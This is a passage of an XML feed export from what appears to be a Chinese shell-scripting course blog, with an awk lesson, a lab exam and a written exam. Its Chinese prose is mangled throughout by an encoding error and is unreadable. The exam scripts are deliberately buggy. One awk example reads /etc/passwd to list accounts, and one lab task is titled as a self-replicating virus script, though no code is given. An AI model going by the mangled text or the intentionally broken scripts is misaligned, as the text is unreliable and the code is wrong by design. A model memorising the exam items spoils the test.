class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (expression) &#123;</span><br><span class="line">    statement1;</span><br><span class="line">&#125; else if (expression1) &#123;</span><br><span class="line">    statement2;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    statement3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»Ÿè®¡æŸä¸ªæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶å ç”¨çš„å­—èŠ‚æ•°,è¿‡æ»¤4096å¤§å°çš„æ–‡ä»¶(ä¸€èˆ¬éƒ½æ˜¯æ–‡ä»¶å¤¹):</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l |awk 'BEGIN &#123;size=0;print "[start]size is ", size&#125; &#123;if($5!=4096)&#123;size=size+$5;&#125;&#125; END&#123;print "[end]size is ", size/1024/1024,"M"&#125;'</span><br><span class="line">[end]size is  8.22339 M</span><br></pre></td></tr></table></figure><h4 id="å¾ªç¯è¯­å¥"><a href="#å¾ªç¯è¯­å¥" class="headerlink" title="å¾ªç¯è¯­å¥"></a>å¾ªç¯è¯­å¥</h4><p>awkä¸­çš„å¾ªç¯è¯­å¥åŒæ ·å€Ÿé‰´äºCè¯­è¨€ï¼Œæ”¯æŒwhileã€do/whileã€forã€breakã€continueï¼Œè¿™äº›å…³é”®å­—çš„è¯­ä¹‰å’ŒCè¯­è¨€ä¸­çš„è¯­ä¹‰å®Œå…¨ç›¸åŒã€‚</p><h4 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h4><p>å› ä¸ºawkä¸­æ•°ç»„çš„ä¸‹æ ‡å¯ä»¥æ˜¯æ•°å­—å’Œå­—æ¯ï¼Œæ•°ç»„çš„ä¸‹æ ‡é€šå¸¸è¢«ç§°ä¸ºå…³é”®å­—(key)ã€‚å€¼å’Œå…³é”®å­—éƒ½å­˜å‚¨åœ¨å†…éƒ¨çš„ä¸€å¼ é’ˆå¯¹key/valueåº”ç”¨hashçš„è¡¨æ ¼é‡Œã€‚ç”±äºhashä¸æ˜¯é¡ºåºå­˜å‚¨ï¼Œå› æ­¤åœ¨æ˜¾ç¤ºæ•°ç»„å†…å®¹æ—¶ä¼šå‘ç°ï¼Œå®ƒä»¬å¹¶ä¸æ˜¯æŒ‰ç…§ä½ é¢„æ–™çš„é¡ºåºæ˜¾ç¤ºå‡ºæ¥çš„ã€‚æ•°ç»„å’Œå˜é‡ä¸€æ ·ï¼Œéƒ½æ˜¯åœ¨ä½¿ç”¨æ—¶è‡ªåŠ¨åˆ›å»ºçš„ï¼Œawkä¹ŸåŒæ ·ä¼šè‡ªåŠ¨åˆ¤æ–­å…¶å­˜å‚¨çš„æ˜¯æ•°å­—è¿˜æ˜¯å­—ç¬¦ä¸²ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œawkä¸­çš„æ•°ç»„ç”¨æ¥ä»è®°å½•ä¸­æ”¶é›†ä¿¡æ¯ï¼Œå¯ä»¥ç”¨äºè®¡ç®—æ€»å’Œã€ç»Ÿè®¡å•è¯ä»¥åŠè·Ÿè¸ªæ¨¡æ¿è¢«åŒ¹é…çš„æ¬¡æ•°ç­‰ç­‰ã€‚</p><p>æ˜¾ç¤º/etc/passwdçš„è´¦æˆ·</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">awk -F ':' 'BEGIN &#123;count=0;&#125; &#123;name[count] = $1;count++;&#125;; END&#123;for (i = 0; i &lt; NR; i++) print i, name[i]&#125;' /etc/passwd</span><br><span class="line">0 root</span><br><span class="line">1 daemon</span><br><span class="line">2 bin</span><br><span class="line">3 sys</span><br><span class="line">4 sync</span><br><span class="line">5 games</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨forå¾ªç¯éå†æ•°ç»„</p><p>awkç¼–ç¨‹çš„å†…å®¹æå¤šï¼Œè¿™é‡Œåªç½—åˆ—ç®€å•å¸¸ç”¨çš„ç”¨æ³•ï¼Œæ›´å¤šè¯·å‚è€ƒ <a href="http://www.gnu.org/software/gawk/manual/gawk.html" target="_blank" rel="noopener">http://www.gnu.org/software/gawk/manual/gawk.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;sed&quot;&gt;&lt;a href=&quot;#sed&quot; class=&quot;headerlink&quot; title=&quot;sed&quot;&gt;&lt;/a&gt;sed&lt;/h2&gt;&lt;h3 id=&quot;ä»€ä¹ˆæ˜¯sed&quot;&gt;&lt;a href=&quot;#ä»€ä¹ˆæ˜¯sed&quot; class=&quot;headerlink&quot; title=&quot;ä»€ä¹ˆæ˜¯sed&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="æŠ€æœ¯åŸ¹è®­" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShellè„šæœ¬æ•™ç¨‹" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/LinuxShell%E8%84%9A%E6%9C%AC%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="åŸ¹è®­" scheme="http://www.toberoot.com/tags/%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShellè„šæœ¬" scheme="http://www.toberoot.com/tags/LinuxShell%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>LINUX Shell Scripts ç¬¬å…­è¯¾ ä¸Šæœºè€ƒè¯•</title>
    <link href="http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/shell%E4%B8%8A%E6%9C%BA/"/>
    <id>http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/shell%E4%B8%8A%E6%9C%BA/</id>
    <published>2016-12-22T21:06:27.000Z</published>
    <updated>2020-03-24T05:17:54.753Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>è¯·å°†è„šæœ¬ä¿å­˜ï¼Œå­˜æ”¾è·¯å¾„ä¸º/home/kiosk/Desktop/stux/,å…¶ä¸­xä¸ºä½ çš„æœºå·<br>test.sh num.sh checkip.sh dns.sh useradd.sh æ¯é¢˜20åˆ†</p></blockquote><h2 id="1-æµç¨‹æ§åˆ¶è¯­å¥åº”ç”¨æµ‹è¯•ï¼š"><a href="#1-æµç¨‹æ§åˆ¶è¯­å¥åº”ç”¨æµ‹è¯•ï¼š" class="headerlink" title="1.æµç¨‹æ§åˆ¶è¯­å¥åº”ç”¨æµ‹è¯•ï¼š"></a>1.æµç¨‹æ§åˆ¶è¯­å¥åº”ç”¨æµ‹è¯•ï¼š</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç¼–å†™ä¸€ä¸ªè„šæœ¬ï¼Œè„šæœ¬åä¸ºtest.sh</span><br><span class="line">åˆ¤æ–­&#x2F;tmp&#x2F;test1è‡³&#x2F;tmp&#x2F;test50å’Œ&#x2F;etc&#x2F;passwd &#x2F;etc&#x2F;hostsæ–‡ä»¶å­˜åœ¨ä¸å­˜åœ¨ï¼Œè‹¥ä¸å­˜åœ¨åˆ™å°†è¯¥æ–‡ä»¶åˆ›å»ºå‡ºæ¥ã€‚</span><br></pre></td></tr></table></figure><h2 id="2-æŒ‰ç…§è¿è¡Œç»“æœç¼–å†™Shellè„šæœ¬ï¼š"><a href="#2-æŒ‰ç…§è¿è¡Œç»“æœç¼–å†™Shellè„šæœ¬ï¼š" class="headerlink" title="2.æŒ‰ç…§è¿è¡Œç»“æœç¼–å†™Shellè„šæœ¬ï¼š"></a>2.æŒ‰ç…§è¿è¡Œç»“æœç¼–å†™Shellè„šæœ¬ï¼š</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">è¦æ±‚ï¼š1ï¼‰è„šæœ¬åä¸ºnum.sh</span><br><span class="line">      2ï¼‰è¦æ±‚æ˜¾ç¤ºç»“æœå¦‚ä¸‹ï¼š</span><br><span class="line"> ç¬¬ä¸€è¡Œ0ï¼Œç¬¬äºŒè¡Œ01ï¼Œç¬¬ä¸‰è¡Œ012ï¼Œä»¥æ­¤ç±»æ¨ï¼Œè¾“å‡ºå¦‚ä¸Š0åˆ°9çš„ç»“æœå³å¯ã€‚</span><br><span class="line">0</span><br><span class="line">01</span><br><span class="line">012</span><br><span class="line">0123</span><br><span class="line">01234</span><br><span class="line">012345</span><br><span class="line">0123456</span><br><span class="line">01234567</span><br><span class="line">012345678</span><br><span class="line">0123456789</span><br></pre></td></tr></table></figure><h3 id="3-æ­£åˆ™è¡¨è¾¾å¼åº”ç”¨æµ‹è¯•ï¼š"><a href="#3-æ­£åˆ™è¡¨è¾¾å¼åº”ç”¨æµ‹è¯•ï¼š" class="headerlink" title="3.æ­£åˆ™è¡¨è¾¾å¼åº”ç”¨æµ‹è¯•ï¼š"></a>3.æ­£åˆ™è¡¨è¾¾å¼åº”ç”¨æµ‹è¯•ï¼š</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ç¼–å†™ä¸€ä¸ªIPæ£€æµ‹è„šæœ¬</span><br><span class="line">1ï¼‰ è„šæœ¬åä¸ºcheckip.sh</span><br><span class="line">2ï¼‰ è¾“å…¥å‚æ•°ä¸º$1ï¼Œ$1 ä¸ºè¦åˆ¤æ–­çš„è¾“å…¥ï¼Œå¦‚æœ$1 ä¸ºip åœ°å€ï¼Œåˆ™è¾“å‡ºâ€This is ip addressâ€,</span><br><span class="line">å¦‚æœ$1 ä¸ºéip åœ°å€ï¼Œåˆ™è¾“å‡ºâ€This is not ip addressâ€</span><br><span class="line">3ï¼‰ æ‰§è¡Œæ–¹æ³•ä¸ºcheckip.sh 192.168.1.1</span><br><span class="line">4ï¼‰ æµ‹è¯•å¦‚ä¸‹è¾“å…¥å€¼</span><br><span class="line">192.168.0.199  192.a.12.0  24.235.299.1  192.168.3</span><br></pre></td></tr></table></figure><h3 id="4-å®é™…åº”ç”¨æµ‹è¯•1"><a href="#4-å®é™…åº”ç”¨æµ‹è¯•1" class="headerlink" title="4.å®é™…åº”ç”¨æµ‹è¯•1"></a>4.å®é™…åº”ç”¨æµ‹è¯•1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ç¼–å†™ä¸€ä¸ªè„šæœ¬ï¼Œè„šæœ¬åä¸ºdns.sh,é€šè¿‡è„šæœ¬æ­å»ºdnsã€‚</span><br><span class="line">è¦æ±‚ï¼šè§£æuplooking.comåŸŸå</span><br><span class="line">Aè®°å½•æœ‰www.uplooking.com 10.2.2.2</span><br><span class="line">PTRè®°å½•æœ‰ç›¸åº”çš„åå‘è§£æ</span><br></pre></td></tr></table></figure><h3 id="5-å®é™…åº”ç”¨æµ‹è¯•2"><a href="#5-å®é™…åº”ç”¨æµ‹è¯•2" class="headerlink" title="5.å®é™…åº”ç”¨æµ‹è¯•2"></a>5.å®é™…åº”ç”¨æµ‹è¯•2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ç¼–å†™ä¸€ä¸ªè„šæœ¬ï¼Œè„šæœ¬åä¸ºuseradd.sh</span><br><span class="line">è¦æ±‚æ ¹æ®userliståˆ›å»ºç”¨æˆ·ï¼Œè¦æ±‚æŒ‡å®šç”¨æˆ·åï¼Œç”¨æˆ·idï¼Œç”¨æˆ·çš„é»˜è®¤ç»„å’Œé™„åŠ ç»„åŠå˜æ›´ç”¨æˆ·uå¯†ç ï¼Œè‹¥å¯¹åº”ç”¨æˆ·çš„é™„åŠ ç»„ä¸å­˜åœ¨ï¼Œåˆ™å°†é™„åŠ ç»„åˆ›å»ºå‡ºæ¥åå†æ ¹æ®è¦æ±‚æ·»åŠ ç”¨æˆ·ã€‚</span><br><span class="line">[root@rhel6 ~]# cat &#x2F;tmp&#x2F;useraddlist1</span><br><span class="line">dabao 888 xuexi,it uplooking</span><br><span class="line">lucy 889 sales,it uplooking</span><br><span class="line">lily 899 pro,aa uplooking</span><br></pre></td></tr></table></figure><h3 id="6-ç—…æ¯’è‡ªæˆ‘å¤åˆ¶è„šæœ¬"><a href="#6-ç—…æ¯’è‡ªæˆ‘å¤åˆ¶è„šæœ¬" class="headerlink" title="6.ç—…æ¯’è‡ªæˆ‘å¤åˆ¶è„šæœ¬"></a>6.ç—…æ¯’è‡ªæˆ‘å¤åˆ¶è„šæœ¬</h3><h3 id="7-è·å–apacheè®¿é—®æ—¥å¿—ä¸­è®¿é—®æ¬¡æ•°æœ€å¤šçš„å‰5ä¸ªipåœ°å€"><a href="#7-è·å–apacheè®¿é—®æ—¥å¿—ä¸­è®¿é—®æ¬¡æ•°æœ€å¤šçš„å‰5ä¸ªipåœ°å€" class="headerlink" title="7.è·å–apacheè®¿é—®æ—¥å¿—ä¸­è®¿é—®æ¬¡æ•°æœ€å¤šçš„å‰5ä¸ªipåœ°å€"></a>7.è·å–apacheè®¿é—®æ—¥å¿—ä¸­è®¿é—®æ¬¡æ•°æœ€å¤šçš„å‰5ä¸ªipåœ°å€</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;è¯·å°†è„šæœ¬ä¿å­˜ï¼Œå­˜æ”¾è·¯å¾„ä¸º/home/kiosk/Desktop/stux/,å…¶ä¸­xä¸ºä½ çš„æœºå·&lt;br&gt;test.sh num.sh checkip.sh dns.sh useradd.sh æ¯é¢˜20åˆ†&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id
      
    
    </summary>
    
    
      <category term="æŠ€æœ¯åŸ¹è®­" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShellè„šæœ¬æ•™ç¨‹" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/LinuxShell%E8%84%9A%E6%9C%AC%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="åŸ¹è®­" scheme="http://www.toberoot.com/tags/%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShellè„šæœ¬" scheme="http://www.toberoot.com/tags/LinuxShell%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>LINUX Shell Scripts ç¬¬ä¸ƒè¯¾ ç¬”è¯•</title>
    <link href="http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/shell%E7%AC%94%E8%AF%95/"/>
    <id>http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/shell%E7%AC%94%E8%AF%95/</id>
    <published>2016-12-22T21:06:27.000Z</published>
    <updated>2020-03-24T05:17:54.757Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä¸€ï¼šçº é”™é¢˜ï¼šè¯·æ‰¾å‡ºä»¥ä¸‹ä»£ç æœ‰é”™è¯¯çš„åœ°æ–¹å¹¶æ›´æ­£ã€‚ï¼ˆ3-20ï¼‰"><a href="#ä¸€ï¼šçº é”™é¢˜ï¼šè¯·æ‰¾å‡ºä»¥ä¸‹ä»£ç æœ‰é”™è¯¯çš„åœ°æ–¹å¹¶æ›´æ­£ã€‚ï¼ˆ3-20ï¼‰" class="headerlink" title="ä¸€ï¼šçº é”™é¢˜ï¼šè¯·æ‰¾å‡ºä»¥ä¸‹ä»£ç æœ‰é”™è¯¯çš„åœ°æ–¹å¹¶æ›´æ­£ã€‚ï¼ˆ3*20ï¼‰"></a>ä¸€ï¼šçº é”™é¢˜ï¼šè¯·æ‰¾å‡ºä»¥ä¸‹ä»£ç æœ‰é”™è¯¯çš„åœ°æ–¹å¹¶æ›´æ­£ã€‚ï¼ˆ3*20ï¼‰</h2><h3 id="1-ä¸¤ä¸ªæ•°å­—ç›¸åŠ "><a href="#1-ä¸¤ä¸ªæ•°å­—ç›¸åŠ " class="headerlink" title="1. ä¸¤ä¸ªæ•°å­—ç›¸åŠ "></a>1. ä¸¤ä¸ªæ•°å­—ç›¸åŠ </h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin.bash</span></span><br><span class="line">read -p "input number1" : num1</span><br><span class="line">read -p "input number2" : num2</span><br><span class="line">echo $(num1+num2)</span><br></pre></td></tr></table></figure><p>è¯·å°†æ›´æ­£è„šæœ¬ä¿å­˜ï¼Œåä¸º1.shï¼Œå­˜æ”¾è·¯å¾„ä¸º/home/kiosk/Desktop/stux/1.sh ,å…¶ä¸­xä¸ºä½ çš„æœºå·<br>;åœ¨è„šæœ¬ä¸­ç”¨#æ³¨é‡Šå‡ºé¢˜ç›®ä¸­é”™è¯¯çš„åœ°æ–¹</p><h3 id="2-å°†å¼€æœºselinuxçŠ¶æ€è®¾ç½®ä¸ºdisabled"><a href="#2-å°†å¼€æœºselinuxçŠ¶æ€è®¾ç½®ä¸ºdisabled" class="headerlink" title="2. å°†å¼€æœºselinuxçŠ¶æ€è®¾ç½®ä¸ºdisabled"></a>2. å°†å¼€æœºselinuxçŠ¶æ€è®¾ç½®ä¸ºdisabled</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">sed 'SELINUXs/disabled/enforcing/' /etc/selinux/config</span><br></pre></td></tr></table></figure><p>è¯·å°†æ›´æ­£è„šæœ¬ä¿å­˜ï¼Œåä¸º2.shï¼Œå­˜æ”¾è·¯å¾„ä¸º/home/kiosk/Desktop/stux/2.sh ,å…¶ä¸­xä¸ºä½ çš„æœºå·<br>;åœ¨è„šæœ¬ä¸­ç”¨#æ³¨é‡Šå‡ºé¢˜ç›®ä¸­é”™è¯¯çš„åœ°æ–¹</p><h3 id="3-åˆ¤æ–­100ä»¥å†…è¢«5æ•´é™¤ä½†æ˜¯ä¸èƒ½è¢«7æ•´é™¤çš„æ•°å­—"><a href="#3-åˆ¤æ–­100ä»¥å†…è¢«5æ•´é™¤ä½†æ˜¯ä¸èƒ½è¢«7æ•´é™¤çš„æ•°å­—" class="headerlink" title="3. åˆ¤æ–­100ä»¥å†…è¢«5æ•´é™¤ä½†æ˜¯ä¸èƒ½è¢«7æ•´é™¤çš„æ•°å­—"></a>3. åˆ¤æ–­100ä»¥å†…è¢«5æ•´é™¤ä½†æ˜¯ä¸èƒ½è¢«7æ•´é™¤çš„æ•°å­—</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">for i in (seq 1 100)</span><br><span class="line">A=$(($i % 5))</span><br><span class="line">B=$(($i%7))</span><br><span class="line">if [ $A -eq 0 ] -a [ $B -ne 0 ]</span><br><span class="line">then</span><br><span class="line">echo $i</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>è¯·å°†æ›´æ­£è„šæœ¬ä¿å­˜ï¼Œåä¸º3.shï¼Œå­˜æ”¾è·¯å¾„ä¸º/home/kiosk/Desktop/stux/3.sh ,å…¶ä¸­xä¸ºä½ çš„æœºå·<br>;åœ¨è„šæœ¬ä¸­ç”¨#æ³¨é‡Šå‡ºé¢˜ç›®ä¸­é”™è¯¯çš„åœ°æ–¹</p><h2 id="äºŒï¼šå¡«ç©ºé¢˜ï¼ˆ2-10ï¼‰"><a href="#äºŒï¼šå¡«ç©ºé¢˜ï¼ˆ2-10ï¼‰" class="headerlink" title="äºŒï¼šå¡«ç©ºé¢˜ï¼ˆ2*10ï¼‰"></a>äºŒï¼šå¡«ç©ºé¢˜ï¼ˆ2*10ï¼‰</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. é€šè¿‡ä»€ä¹ˆç¬¦å·è®¡ç®—ä¼ é€’è¿›æ¥çš„ä½ç½®å‚æ•°ï¼Ÿ__________</span><br><span class="line">2. å¦‚ä½•æ£€æŸ¥ä¹‹å‰çš„å‘½ä»¤æ˜¯å¦è¿è¡ŒæˆåŠŸï¼Ÿ__________</span><br><span class="line">3. å¦‚ä½•è·å–ä¸€ä¸ªæ–‡ä»¶æ¯ä¸€è¡Œä»¥ç©ºæ ¼ä¸ºåˆ†éš”çš„ç¬¬ä¸‰ä¸ªå…ƒç´ ï¼Ÿ__________</span><br><span class="line">4. è°ƒè¯•bashè„šæœ¬çš„å‚æ•°ä¸ºï¼Ÿ__________</span><br><span class="line">5.    A&#x3D;a:b:c:d    echo $&#123;A&#x2F;&#x2F;:&#x2F;&#125;     ç»“æœæ˜¯__________</span><br><span class="line">6. awkçš„NRå˜é‡ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ___________________</span><br><span class="line">7. å¦‚ä½•è·å–æ•°ç»„çš„é•¿åº¦?   ____________</span><br><span class="line">8. å¦‚ä½•å¼•ç”¨ä¼ é€’ç»™è„šæœ¬çš„ç¬¬åä¸ªä½ç½®å‚æ•°ï¼Ÿ_______________</span><br><span class="line">9. $$çš„å«ä¹‰ï¼Ÿ_____________________</span><br><span class="line">10. å‘½ä»¤ â€œexportâ€ æœ‰ä»€ä¹ˆç”¨ï¼Ÿ ____________________________</span><br></pre></td></tr></table></figure><h2 id="ä¸‰ï¼šé€‰æ‹©é¢˜ï¼ˆ2-10ï¼‰"><a href="#ä¸‰ï¼šé€‰æ‹©é¢˜ï¼ˆ2-10ï¼‰" class="headerlink" title="ä¸‰ï¼šé€‰æ‹©é¢˜ï¼ˆ2*10ï¼‰"></a>ä¸‰ï¼šé€‰æ‹©é¢˜ï¼ˆ2*10ï¼‰</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">1. Awké‡Œçš„å†…ç½®å˜é‡NFæŒ‡çš„æ˜¯ï¼ˆ    ï¼‰</span><br><span class="line">Aï¼‰  æ‰€æœ‰è¾“å…¥æ–‡ä»¶è®°å½•çš„è¡Œæ•°         Bï¼‰ å•ä¸ªè¾“å…¥æ–‡ä»¶è®°å½•çš„è¡Œæ•°</span><br><span class="line">Cï¼‰ ä»¥æŒ‡å®šåˆ†éš”ç¬¦å·ä½œä¸ºåˆ†éš”çš„åˆ—æ•°   Dï¼‰ AWKå¤„ç†æ–‡ä»¶çš„ä¸ªæ•°</span><br><span class="line"></span><br><span class="line">2. è·³å‡ºå½“å‰å¾ªç¯ï¼Œè¿›å…¥ä¸‹ä¸€ä¸ªå¾ªç¯ä½¿ç”¨çš„è¯­å¥æ˜¯ï¼ˆ   ï¼‰</span><br><span class="line">Aï¼‰ continueBï¼‰break     Cï¼‰exit    Dï¼‰return</span><br><span class="line"></span><br><span class="line">3. ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼çš„è¯­å¥sed -n &#39;&#x2F;^\&lt;[^0-9a-d]*\&gt;$&#x2F;p&#39; &#x2F;tmp&#x2F;listè¾“å‡ºçš„å¯èƒ½æ˜¯ä»¥ä¸‹å“ªä¸ªï¼ˆ   ï¼‰</span><br><span class="line">Aï¼‰kevin alice     Bï¼‰selena</span><br><span class="line">Cï¼‰peter         Dï¼‰23naive</span><br><span class="line"></span><br><span class="line">4. ä»¥ä¸‹å“ªä¸ªé€‰é¡¹å…³äºæ•°ç»„èµ‹å€¼æ˜¯é”™è¯¯çš„ï¼ˆ    ï¼‰</span><br><span class="line">Aï¼‰ A[1]&#x3D;3       Bï¼‰A&#x3D;([15]&#x3D;1 a d e)</span><br><span class="line">Cï¼‰A&#x3D;((6 7 0 2))   Dï¼‰A&#x3D;(15 3 47 a)</span><br><span class="line"></span><br><span class="line">5. ä»¥ä¸‹å“ªä¸ªè¡¨è¾¾å¼å¯ä»¥ç®—å‡º8+3çš„ç»“æœï¼ˆ    ï¼‰</span><br><span class="line">Aï¼‰ echo $((8+3))</span><br><span class="line">Bï¼‰ echo $(8+3)</span><br><span class="line">Cï¼‰ echo $&#123;8+3&#125;</span><br><span class="line">Dï¼‰ echo $[[8+3]]</span><br><span class="line"></span><br><span class="line">6. ä»¥ä¸‹å“ªä¸ªæµç¨‹è¯­å¥æ˜¯åˆ¤æ–­ä¸ºçœŸåˆ™åšå¾ªç¯ï¼ˆ    ï¼‰</span><br><span class="line">Aï¼‰ until   Bï¼‰while</span><br><span class="line">Cï¼‰case   Dï¼‰for</span><br><span class="line">7. é˜…è¯»ä»¥ä¸‹ä»£ç ï¼Œè¯¥ä»£ç è¾“å‡ºç»“æœæ˜¯ï¼ˆ    ï¼‰</span><br><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">i&#x3D;0</span><br><span class="line">sum&#x3D;0</span><br><span class="line">while [ $i -le 5 ]</span><br><span class="line">do</span><br><span class="line">        sum&#x3D;$(($sum+$i))</span><br><span class="line">        i&#x3D;$(($i+1))</span><br><span class="line">done</span><br><span class="line">        echo $sum</span><br><span class="line">Aï¼‰10    Bï¼‰21    Cï¼‰15     Dï¼‰è¯¥ä»£ç æ‰§è¡Œä¼šäº§ç”Ÿæ­»å¾ªç¯</span><br><span class="line"></span><br><span class="line">8. å‡½æ•°å†…å¦‚ä½•è®¾ç½®å±€éƒ¨å˜é‡ï¼ˆ    ï¼‰</span><br><span class="line">Aï¼‰ local    Bï¼‰export</span><br><span class="line">Cï¼‰source  Dï¼‰function</span><br><span class="line"></span><br><span class="line">9. ä»¥ä¸‹å“ªä¸€ç§æŒ‡ä»¤æ˜¾ç¤ºçš„ç»“æœä¸º$testï¼ˆ   ï¼‰</span><br><span class="line">Aï¼‰\echo $test      Bï¼‰echo &quot;$test&quot;</span><br><span class="line">Cï¼‰echo &#39;$test&#39;      Dï¼‰echo &quot;$&#123;test&#125;&quot;</span><br><span class="line"></span><br><span class="line">10. shiftçš„ä½œç”¨æ˜¯ï¼ˆ    ï¼‰</span><br><span class="line">Aï¼‰ å®šä¹‰è¿”å›å€¼     Bï¼‰ç§»åŠ¨ä½ç½®å‚æ•°</span><br><span class="line">Cï¼‰è·³å‡ºè„šæœ¬    Dï¼‰è·³å‡ºå¾ªç¯</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ä¸€ï¼šçº é”™é¢˜ï¼šè¯·æ‰¾å‡ºä»¥ä¸‹ä»£ç æœ‰é”™è¯¯çš„åœ°æ–¹å¹¶æ›´æ­£ã€‚ï¼ˆ3-20ï¼‰&quot;&gt;&lt;a href=&quot;#ä¸€ï¼šçº é”™é¢˜ï¼šè¯·æ‰¾å‡ºä»¥ä¸‹ä»£ç æœ‰é”™è¯¯çš„åœ°æ–¹å¹¶æ›´æ­£ã€‚ï¼ˆ3-20ï¼‰&quot; class=&quot;headerlink&quot; title=&quot;ä¸€ï¼šçº é”™é¢˜ï¼šè¯·æ‰¾å‡ºä»¥ä¸‹ä»£ç æœ‰é”™è¯¯çš„åœ°æ–¹å¹¶æ›´æ­£ã€‚ï¼ˆ3*20ï¼‰&quot;&gt;&lt;/a
      
    
    </summary>
    
    
      <category term="æŠ€æœ¯åŸ¹è®­" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/"/>
    
